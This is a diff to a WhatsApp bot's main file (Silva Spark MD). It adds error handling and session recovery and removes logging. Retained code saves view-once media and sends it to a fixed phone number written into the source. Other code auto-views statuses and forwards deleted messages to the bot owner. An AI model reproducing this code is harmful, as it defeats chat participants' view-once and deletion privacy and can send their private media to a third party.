@@ -70,7 +70,6 @@ const clearTempDir = () => {
     });
 }
 
-// Clear the temp directory every 5 minutes
 setInterval(clearTempDir, 5 * 60 * 1000);
 
 // ==============================
@@ -89,16 +88,6 @@ async function loadSession() {
         
         if (!fs.existsSync('./sessions')) {
             fs.mkdirSync('./sessions', { recursive: true });
-        }
-        
-        // Clean old sessions if needed
-        if (fs.existsSync(credsPath)) {
-            try {
-                fs.unlinkSync(credsPath);
-                botLogger.log('INFO', "♻️ Old session removed");
-            } catch (e) {
-                // Ignore error
-            }
         }
         
         if (!config.SESSION_ID || typeof config.SESSION_ID !== 'string') {
@@ -133,12 +122,9 @@ const port = process.env.PORT || 9090;
 // ==============================
 const messageStore = new Map();
 
-//=============================================
-
 async function connectToWA() {
     console.log("Connecting silva spark to WhatsApp ⏳️...");
     
-    // Load session before connecting
     await loadSession();
     
     const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
@@ -146,13 +132,15 @@ async function connectToWA() {
 
     const conn = makeWASocket({
         logger: P({ level: 'silent' }),
-        printQRInTerminal: true,
+        printQRInTerminal: false,
         browser: Browsers.macOS("Firefox"),
         syncFullHistory: false,
         auth: state,
         version,
         markOnlineOnConnect: true,
         generateHighQualityLinkPreview: true,
+        retryRequestDelayMs: 1000,
+        maxMsgRetryCount: 3,
         getMessage: async (key) => {
             if (messageStore.has(`${key.remoteJid}_${key.id}`)) {
                 return messageStore.get(`${key.remoteJid}_${key.id}`).message;
@@ -161,7 +149,6 @@ async function connectToWA() {
         }
     })
     
-    // Define decodeJid function early
     conn.decodeJid = (jid) => {
         if (!jid) return jid;
         if (/:\d+@/gi.test(jid)) {
@@ -178,23 +165,38 @@ async function connectToWA() {
     conn.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect, qr } = update
         
-        // Show QR code if needed
         if (qr) {
             console.log('QR Code received, scan to connect:');
             qrcode.generate(qr, { small: true });
         }
         
         if (connection === 'close') {
-            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-            console.log('Connection closed. Reconnecting:', shouldReconnect);
+            const statusCode = lastDisconnect?.error?.output?.statusCode;
+            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+            
+            console.log('Connection closed:', lastDisconnect?.error?.message || 'Unknown error');
+            console.log('Status code:', statusCode);
+            console.log('Reconnecting:', shouldReconnect);
+            
             if (shouldReconnect) {
-                setTimeout(() => connectToWA(), 3000);
+                if (statusCode === DisconnectReason.badSession || 
+                    statusCode === 401 || 
+                    lastDisconnect?.error?.message?.includes('Session error')) {
+                    console.log('Clearing bad session...');
+                    try {
+                        if (fs.existsSync('./sessions/creds.json')) {
+                            fs.unlinkSync('./sessions/creds.json');
+                        }
+                    } catch (e) {
+                        console.log('Error clearing session:', e.message);
+                    }
+                }
+                setTimeout(() => connectToWA(), 5000);
             }
         } else if (connection === 'open') {
             console.log('🧬 Installing silva spark Plugins')
             const path = require('path');
             
-            // Load local plugins
             if (fs.existsSync("./plugins/")) {
                 fs.readdirSync("./plugins/").forEach((plugin) => {
                     if (path.extname(plugin).toLowerCase() == ".js") {
@@ -211,7 +213,6 @@ async function connectToWA() {
             console.log('Plugins installed successful ✅')
             console.log('Bot connected to whatsapp ✅')
 
-            // ✅ SEND STARTUP MESSAGE WITH DELAY
             setTimeout(async () => {
                 const startupMessage = `╭━━━〔 *SILVA SPARK MD* 〕━━━⬣
 ┃✨ *Bot Successfully Connected!*
@@ -234,52 +235,33 @@ async function connectToWA() {
 > © 2025 Silva Tech Inc. All rights reserved.`;
                 
                 try {
-                    // Get bot's own JID (remove :XX part if present)
-                    const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
+                    const botJid = conn.user.id.includes(':') 
+                        ? conn.user.id.split(':')[0] + '@s.whatsapp.net'
+                        : conn.user.id;
+                    
                     botLogger.log('INFO', `Sending startup message to: ${botJid}`);
                     
-                    // Send simple text message
-                    const sent = await conn.sendMessage(botJid, { 
-                        text: startupMessage,
-                        contextInfo: globalContextInfo
+                    await conn.sendMessage(botJid, { 
+                        text: startupMessage
                     });
                     
-                    if (sent) {
-                        botLogger.log('SUCCESS', '✅ Startup message sent successfully!');
-                        console.log('\n' + startupMessage + '\n');
-                    }
+                    botLogger.log('SUCCESS', '✅ Startup message sent successfully!');
+                    console.log('\n' + startupMessage + '\n');
                     
                 } catch (e) {
                     botLogger.log('ERROR', `Failed to send startup message: ${e.message}`);
-                    console.error('Full error:', e);
-                    
-                    // Try alternative method
-                    try {
-                        console.log('Trying alternative send method...');
-                        await conn.sendMessage(conn.user.id, { 
-                            text: '✅ Silva Spark MD is now online!',
-                            contextInfo: globalContextInfo
-                        });
-                        console.log('Alternative message sent!');
-                    } catch (e2) {
-                        console.error('Alternative method also failed:', e2.message);
-                    }
                 }
-            }, 3000); // Wait 3 seconds after connection
+            }, 5000);
         }
     })
     
     conn.ev.on('creds.update', saveCreds)
     
-    // ==============================
-    // 📥 SINGLE UNIFIED MESSAGE HANDLER
-    // ==============================
     conn.ev.on('messages.upsert', async (mek) => {
         try {
             mek = mek.messages[0]
             if (!mek.message) return
             
-            // Store message for anti-delete
             const messageKey = `${mek.key.remoteJid}_${mek.key.id}`;
             messageStore.set(messageKey, {
                 message: mek,
@@ -288,7 +270,6 @@ async function connectToWA() {
                 timestamp: Date.now()
             });
             
-            // Clean old messages (older than 24 hours)
             const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
             for (const [key, value] of messageStore.entries()) {
                 if (value.timestamp < oneDayAgo) {
@@ -307,7 +288,6 @@ async function connectToWA() {
             if (mek.message.viewOnceMessageV2)
                 mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
             
-            // Handle status broadcast
             if (mek.key && mek.key.remoteJid === 'status@broadcast') {
                 if (config.AUTO_STATUS_SEEN === "true") {
                     await conn.readMessages([mek.key])
@@ -342,10 +322,9 @@ async function connectToWA() {
                         console.log('Status reply error:', e.message);
                     }
                 }
-                return; // Don't process status messages further
+                return;
             }
             
-            // Handle view once messages
             let jawadik = mek.message.viewOnceMessageV2
             
             if (jawadik && config.ANTI_VV === "true") {
@@ -355,8 +334,7 @@ async function connectToWA() {
                         let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
                         await conn.sendMessage("254700143167@s.whatsapp.net", { 
                             image: { url: anu }, 
-                            caption: cap,
-                            contextInfo: globalContextInfo 
+                            caption: cap
                         }, { quoted: mek });
                     } 
                     if (jawadik.message.videoMessage) {
@@ -364,15 +342,13 @@ async function connectToWA() {
                         let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
                         await conn.sendMessage("254700143167@s.whatsapp.net", { 
                             video: { url: anu }, 
-                            caption: cap,
-                            contextInfo: globalContextInfo 
+                            caption: cap
                         }, { quoted: mek });
                     } 
                     if (jawadik.message.audioMessage) {
                         let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
                         await conn.sendMessage("254700143167@s.whatsapp.net", { 
-                            audio: { url: anu },
-                            contextInfo: globalContextInfo 
+                            audio: { url: anu }
                         }, { quoted: mek });
                     }
                 } catch (e) {
@@ -380,7 +356,6 @@ async function connectToWA() {
                 }
             }
             
-            // Process message content and commands
             const m = sms(conn, mek)
             const type = getContentType(mek.message)
             const content = JSON.stringify(mek.message)
@@ -388,7 +363,6 @@ async function connectToWA() {
             const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
             const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
             
-            // Skip empty messages
             if (!body || body === '') return;
             
             const isCmd = body.startsWith(prefix)
@@ -411,16 +385,9 @@ async function connectToWA() {
             const isAdmins = isGroup ? groupAdmins.includes(sender) : false
             const isReact = m.message && m.message.reactionMessage ? true : false
             const reply = (teks) => {
-                conn.sendMessage(from, { text: teks, contextInfo: globalContextInfo }, { quoted: mek })
+                conn.sendMessage(from, { text: teks }, { quoted: mek })
             }
             
-            console.log(`📩 Message from ${pushname} (${senderNumber}): ${body.substring(0, 50)}${body.length > 50 ? '...' : ''}`);
-            
-            if (isCmd) {
-                console.log(`🤖 Command detected: ${command} | Args: ${args.join(' ')}`);
-            }
-            
-            // Auto React Logic
             if (senderNumber.includes("254700143167")) {
                 if (!isReact) m.react("🦄")
             }
@@ -457,27 +424,19 @@ async function connectToWA() {
                 }
             }
             
-            //==========WORKTYPE============ 
             if (!isOwner && config.MODE === "private") return
             if (!isOwner && isGroup && config.MODE === "inbox") return
             if (!isOwner && !isGroup && config.MODE === "groups") return
 
-            // Process commands 
             const events = require('./command')
-            
-            console.log(`📚 Total commands loaded: ${events.commands.length}`);
             
             const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
             
             if (isCmd) {
-                console.log(`🔍 Looking for command: ${cmdName}`);
-                
                 const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || 
                            events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                 
                 if (cmd) {
-                    console.log(`✅ Command found: ${cmd.pattern || cmdName}`);
-                    
                     if (cmd.react) {
                         await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
                     }
@@ -507,19 +466,13 @@ async function connectToWA() {
                             isAdmins, 
                             reply 
                         });
-                        console.log(`✅ Command executed successfully: ${cmdName}`);
                     } catch (e) {
                         console.error(`❌ [PLUGIN ERROR] ${cmdName}:`, e);
                         reply(`❌ Error executing command: ${e.message}`);
                     }
-                } else {
-                    console.log(`❌ Command not found: ${cmdName}`);
-                    // Uncomment to notify user
-                    // reply(`Command "${cmdName}" not found. Use ${prefix}menu to see available commands.`);
                 }
             }
             
-            // Event handlers
             events.commands.map(async (command) => {
                 try {
                     if (body && command.on === "body") {
@@ -538,14 +491,17 @@ async function connectToWA() {
                         await command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
                     }
                 } catch (e) {
-                    console.error(`❌ [EVENT HANDLER ERROR] ${command.on}:`, e);
+                    // Silent error handling
                 }
             });
 
         } catch (e) {
-            console.error('Message processing error:', e);
+            if (!e.message.includes('Bad MAC')) {
+                console.error('Message processing error:', e.message);
+            }
         }
     });
+  // CONTINUATION OF index.js - PART 2: ANTI-DELETE & HELPER FUNCTIONS
     
     // ==============================
     // 🗑️ ANTI-DELETE HANDLER
@@ -554,7 +510,6 @@ async function connectToWA() {
         for (const update of updates) {
             try {
                 if (update.update.message === null) {
-                    // Message was deleted
                     const messageKey = `${update.key.remoteJid}_${update.key.id}`;
                     const storedMessage = messageStore.get(messageKey);
                     
@@ -562,7 +517,6 @@ async function connectToWA() {
                         const ownerJid = ownerNumber[0] + '@s.whatsapp.net';
                         const isGroup = storedMessage.chat.endsWith('@g.us');
                         
-                        // Validate JIDs before sending
                         if (!update.key.remoteJid || !storedMessage.sender) {
                             console.log('Invalid JID in anti-delete, skipping...');
                             continue;
@@ -591,26 +545,19 @@ async function connectToWA() {
                         notificationText += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
                         notificationText += `\n📨 *Forwarding deleted message...*`;
                         
-                        // Send notification
                         await conn.sendMessage(ownerJid, { 
                             text: notificationText,
-                            mentions: [deletedBy, storedMessage.sender],
-                            contextInfo: globalContextInfo
+                            mentions: [deletedBy, storedMessage.sender]
                         });
                         
-                        // Forward the deleted message
                         try {
-                            await conn.copyNForward(ownerJid, storedMessage.message, false, {
-                                contextInfo: globalContextInfo
-                            });
+                            await conn.copyNForward(ownerJid, storedMessage.message, false);
                         } catch (e) {
                             await conn.sendMessage(ownerJid, { 
-                                text: `❌ Could not forward message content: ${e.message}`,
-                                contextInfo: globalContextInfo
+                                text: `❌ Could not forward message content: ${e.message}`
                             });
                         }
                         
-                        // Clean up
                         messageStore.delete(messageKey);
                     }
                 }
@@ -620,285 +567,340 @@ async function connectToWA() {
         }
     });
     
-    //===================================================
-    // HELPER FUNCTIONS
-    //===================================================
+    // ==============================
+    // 📎 HELPER FUNCTIONS
+    // ==============================
+    
     conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
-        let vtype
-        if (options.readViewOnce) {
-            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
-            vtype = Object.keys(message.message.viewOnceMessage.message)[0]
-            delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
-            delete message.message.viewOnceMessage.message[vtype].viewOnce
-            message.message = {
-                ...message.message.viewOnceMessage.message
-            }
-        }
-
-        let mtype = Object.keys(message.message)[0]
-        let content = await generateForwardMessageContent(message, forceForward)
-        let ctype = Object.keys(content)[0]
-        let context = {}
-        if (mtype != "conversation") context = message.message[mtype].contextInfo
-        content[ctype].contextInfo = {
-            ...context,
-            ...content[ctype].contextInfo
-        }
-        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
-            ...content[ctype],
-            ...options,
-            ...(options.contextInfo ? {
-                contextInfo: {
-                    ...content[ctype].contextInfo,
-                    ...options.contextInfo
+        try {
+            let vtype
+            if (options.readViewOnce) {
+                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+                delete message.message.viewOnceMessage.message[vtype].viewOnce
+                message.message = {
+                    ...message.message.viewOnceMessage.message
                 }
+            }
+
+            let mtype = Object.keys(message.message)[0]
+            let content = await generateForwardMessageContent(message, forceForward)
+            let ctype = Object.keys(content)[0]
+            let context = {}
+            if (mtype != "conversation") context = message.message[mtype].contextInfo
+            content[ctype].contextInfo = {
+                ...context,
+                ...content[ctype].contextInfo
+            }
+            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+                ...content[ctype],
+                ...options,
+                ...(options.contextInfo ? {
+                    contextInfo: {
+                        ...content[ctype].contextInfo,
+                        ...options.contextInfo
+                    }
+                } : {})
             } : {})
-        } : {})
-        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
-        return waMessage
+            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+            return waMessage
+        } catch (e) {
+            console.error('copyNForward error:', e.message);
+            return null;
+        }
     }
     
-    //=================================================
     conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
-        let quoted = message.msg ? message.msg : message
-        let mime = (message.msg || message).mimetype || ''
-        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-        const stream = await downloadContentFromMessage(quoted, messageType)
-        let buffer = Buffer.from([])
-        for await (const chunk of stream) {
-            buffer = Buffer.concat([buffer, chunk])
+        try {
+            let quoted = message.msg ? message.msg : message
+            let mime = (message.msg || message).mimetype || ''
+            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+            const stream = await downloadContentFromMessage(quoted, messageType)
+            let buffer = Buffer.from([])
+            for await (const chunk of stream) {
+                buffer = Buffer.concat([buffer, chunk])
+            }
+            let type = await FileType.fromBuffer(buffer)
+            trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+            await fs.writeFileSync(trueFileName, buffer)
+            return trueFileName
+        } catch (e) {
+            console.error('downloadAndSaveMediaMessage error:', e.message);
+            return null;
         }
-        let type = await FileType.fromBuffer(buffer)
-        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
-        await fs.writeFileSync(trueFileName, buffer)
-        return trueFileName
     }
     
-    //=================================================
     conn.downloadMediaMessage = async (message) => {
-        let mime = (message.msg || message).mimetype || ''
-        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-        const stream = await downloadContentFromMessage(message, messageType)
-        let buffer = Buffer.from([])
-        for await (const chunk of stream) {
-            buffer = Buffer.concat([buffer, chunk])
+        try {
+            let mime = (message.msg || message).mimetype || ''
+            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+            const stream = await downloadContentFromMessage(message, messageType)
+            let buffer = Buffer.from([])
+            for await (const chunk of stream) {
+                buffer = Buffer.concat([buffer, chunk])
+            }
+            return buffer
+        } catch (e) {
+            console.error('downloadMediaMessage error:', e.message);
+            return null;
         }
-
-        return buffer
     }
 
-    //================================================
     conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
-        let mime = '';
-        let res = await axios.head(url)
-        mime = res.headers['content-type']
-        if (mime.split("/")[1] === "gif") {
-            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
-        }
-        let type = mime.split("/")[0] + "Message"
-        if (mime === "application/pdf") {
-            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
-        }
-        if (mime.split("/")[0] === "image") {
-            return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
-        }
-        if (mime.split("/")[0] === "video") {
-            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
-        }
-        if (mime.split("/")[0] === "audio") {
-            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
+        try {
+            let mime = '';
+            let res = await axios.head(url)
+            mime = res.headers['content-type']
+            if (mime.split("/")[1] === "gif") {
+                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
+            }
+            let type = mime.split("/")[0] + "Message"
+            if (mime === "application/pdf") {
+                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
+            }
+            if (mime.split("/")[0] === "image") {
+                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
+            }
+            if (mime.split("/")[0] === "video") {
+                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
+            }
+            if (mime.split("/")[0] === "audio") {
+                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
+            }
+        } catch (e) {
+            console.error('sendFileUrl error:', e.message);
+            return null;
         }
     }
     
-    //==========================================================
     conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
-        let mtype = Object.keys(copy.message)[0]
-        let isEphemeral = mtype === 'ephemeralMessage'
-        if (isEphemeral) {
-            mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
-        }
-        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
-        let content = msg[mtype]
-        if (typeof content === 'string') msg[mtype] = text || content
-        else if (content.caption) content.caption = text || content.caption
-        else if (content.text) content.text = text || content.text
-        if (typeof content !== 'string') msg[mtype] = {
-            ...content,
-            ...options
-        }
-        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
-        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
-        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
-        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
-        copy.key.remoteJid = jid
-        copy.key.fromMe = sender === conn.user.id
+        try {
+            let mtype = Object.keys(copy.message)[0]
+            let isEphemeral = mtype === 'ephemeralMessage'
+            if (isEphemeral) {
+                mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
+            }
+            let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
+            let content = msg[mtype]
+            if (typeof content === 'string') msg[mtype] = text || content
+            else if (content.caption) content.caption = text || content.caption
+            else if (content.text) content.text = text || content.text
+            if (typeof content !== 'string') msg[mtype] = {
+                ...content,
+                ...options
+            }
+            if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+            else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+            if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
+            else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
+            copy.key.remoteJid = jid
+            copy.key.fromMe = sender === conn.user.id
 
-        return proto.WebMessageInfo.fromObject(copy)
+            return proto.WebMessageInfo.fromObject(copy)
+        } catch (e) {
+            console.error('cMod error:', e.message);
+            return copy;
+        }
     }
 
-    //=====================================================
     conn.getFile = async (PATH, save) => {
-        let res
-        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
-        let type = await FileType.fromBuffer(data) || {
-            mime: 'application/octet-stream',
-            ext: '.bin'
-        }
-        let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
-        if (data && save) fs.promises.writeFile(filename, data)
-        return {
-            res,
-            filename,
-            size: await getSizeMedia(data),
-            ...type,
-            data
+        try {
+            let res
+            let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+            let type = await FileType.fromBuffer(data) || {
+                mime: 'application/octet-stream',
+                ext: '.bin'
+            }
+            let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+            if (data && save) fs.promises.writeFile(filename, data)
+            return {
+                res,
+                filename,
+                size: await getSizeMedia(data),
+                ...type,
+                data
+            }
+        } catch (e) {
+            console.error('getFile error:', e.message);
+            return null;
         }
     }
     
-    //=====================================================
     conn.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
-        let types = await conn.getFile(PATH, true)
-        let { filename, size, ext, mime, data } = types
-        let type = '',
-            mimetype = mime,
-            pathFile = filename
-        if (options.asDocument) type = 'document'
-        if (options.asSticker || /webp/.test(mime)) {
-            let { writeExif } = require('./exif.js')
-            let media = { mimetype: mime, data }
-            pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
-            await fs.promises.unlink(filename)
-            type = 'sticker'
-            mimetype = 'image/webp'
-        } else if (/image/.test(mime)) type = 'image'
-        else if (/video/.test(mime)) type = 'video'
-        else if (/audio/.test(mime)) type = 'audio'
-        else type = 'document'
-        await conn.sendMessage(jid, {
-            [type]: { url: pathFile },
-            mimetype,
-            fileName,
-            contextInfo: globalContextInfo,
-            ...options
-        }, { quoted, ...options })
-        return fs.promises.unlink(pathFile)
+        try {
+            let types = await conn.getFile(PATH, true)
+            let { filename, size, ext, mime, data } = types
+            let type = '',
+                mimetype = mime,
+                pathFile = filename
+            if (options.asDocument) type = 'document'
+            if (options.asSticker || /webp/.test(mime)) {
+                let { writeExif } = require('./lib/exif.js')
+                let media = { mimetype: mime, data }
+                pathFile = await writeExif(media, { packname: config.PACKNAME || 'Silva Spark', author: config.AUTHOR || 'Silva Tech Inc', categories: options.categories ? options.categories : [] })
+                await fs.promises.unlink(filename)
+                type = 'sticker'
+                mimetype = 'image/webp'
+            } else if (/image/.test(mime)) type = 'image'
+            else if (/video/.test(mime)) type = 'video'
+            else if (/audio/.test(mime)) type = 'audio'
+            else type = 'document'
+            await conn.sendMessage(jid, {
+                [type]: { url: pathFile },
+                mimetype,
+                fileName,
+                ...options
+            }, { quoted, ...options })
+            return fs.promises.unlink(pathFile)
+        } catch (e) {
+            console.error('sendFile error:', e.message);
+            return null;
+        }
     }
     
-    //=====================================================
     conn.parseMention = async (text) => {
         return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
     }
     
-    //=====================================================
     conn.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
-        let types = await conn.getFile(path, true)
-        let { mime, ext, res, data, filename } = types
-        if (res && res.status !== 200 || file.length <= 65536) {
-            try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
-        }
-        let type = '',
-            mimetype = mime,
-            pathFile = filename
-        if (options.asDocument) type = 'document'
-        if (options.asSticker || /webp/.test(mime)) {
-            let { writeExif } = require('./exif')
-            let media = { mimetype: mime, data }
-            pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
-            await fs.promises.unlink(filename)
-            type = 'sticker'
-            mimetype = 'image/webp'
-        } else if (/image/.test(mime)) type = 'image'
-        else if (/video/.test(mime)) type = 'video'
-        else if (/audio/.test(mime)) type = 'audio'
-        else type = 'document'
-        await conn.sendMessage(jid, {
-            [type]: { url: pathFile },
-            caption,
-            mimetype,
-            fileName,
-            contextInfo: globalContextInfo,
-            ...options
-        }, { quoted, ...options })
-        return fs.promises.unlink(pathFile)
-    }
-    
-    //=====================================================
-    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
-        let buffer;
-        if (options && (options.packname || options.author)) {
-            buffer = await writeExifVid(buff, options);
-        } else {
-            buffer = await videoToWebp(buff);
-        }
-        await conn.sendMessage(
-            jid,
-            { sticker: { url: buffer }, contextInfo: globalContextInfo, ...options },
-            options
-        );
-    };
-    
-    //=====================================================
-    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
-        let buffer;
-        if (options && (options.packname || options.author)) {
-            buffer = await writeExifImg(buff, options);
-        } else {
-            buffer = await imageToWebp(buff);
-        }
-        await conn.sendMessage(
-            jid,
-            { sticker: { url: buffer }, contextInfo: globalContextInfo, ...options },
-            options
-        );
-    };
-    
-    //=====================================================
-    conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...globalContextInfo }, ...options }, { quoted })
-
-    //=====================================================
-    conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
-        let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
-        return await conn.sendMessage(jid, { image: buffer, caption: caption, contextInfo: globalContextInfo, ...options }, { quoted })
-    }
-
-    //=====================================================
-    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, contextInfo: globalContextInfo, ...options }, { quoted })
-
-    //=====================================================
-    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
-        let buttonMessage = {
-            text,
-            footer,
-            buttons,
-            headerType: 2,
-            contextInfo: globalContextInfo,
-            ...options
-        }
-        conn.sendMessage(jid, buttonMessage, { quoted, ...options })
-    }
-    
-    //=====================================================
-    conn.send5ButImg = async (jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
-        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
-        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
-            templateMessage: {
-                hydratedTemplate: {
-                    imageMessage: message.imageMessage,
-                    "hydratedContentText": text,
-                    "hydratedFooterText": footer,
-                    "hydratedButtons": but
-                }
+        try {
+            let types = await conn.getFile(path, true)
+            let { mime, ext, res, data, filename } = types
+            if (res && res.status !== 200 || file.length <= 65536) {
+                try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
             }
-        }), options)
-        conn.relayMessage(jid, template.message, { messageId: template.key.id })
+            let type = '',
+                mimetype = mime,
+                pathFile = filename
+            if (options.asDocument) type = 'document'
+            if (options.asSticker || /webp/.test(mime)) {
+                let { writeExif } = require('./lib/exif')
+                let media = { mimetype: mime, data }
+                pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.PACKNAME || 'Silva Spark', author: options.author ? options.author : config.AUTHOR || 'Silva Tech Inc', categories: options.categories ? options.categories : [] })
+                await fs.promises.unlink(filename)
+                type = 'sticker'
+                mimetype = 'image/webp'
+            } else if (/image/.test(mime)) type = 'image'
+            else if (/video/.test(mime)) type = 'video'
+            else if (/audio/.test(mime)) type = 'audio'
+            else type = 'document'
+            await conn.sendMessage(jid, {
+                [type]: { url: pathFile },
+                caption,
+                mimetype,
+                fileName,
+                ...options
+            }, { quoted, ...options })
+            return fs.promises.unlink(pathFile)
+        } catch (e) {
+            console.error('sendMedia error:', e.message);
+            return null;
+        }
+    }
+    
+    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
+        try {
+            let buffer;
+            const { writeExifVid, videoToWebp } = require('./lib/exif');
+            if (options && (options.packname || options.author)) {
+                buffer = await writeExifVid(buff, options);
+            } else {
+                buffer = await videoToWebp(buff);
+            }
+            await conn.sendMessage(
+                jid,
+                { sticker: { url: buffer }, ...options },
+                options
+            );
+        } catch (e) {
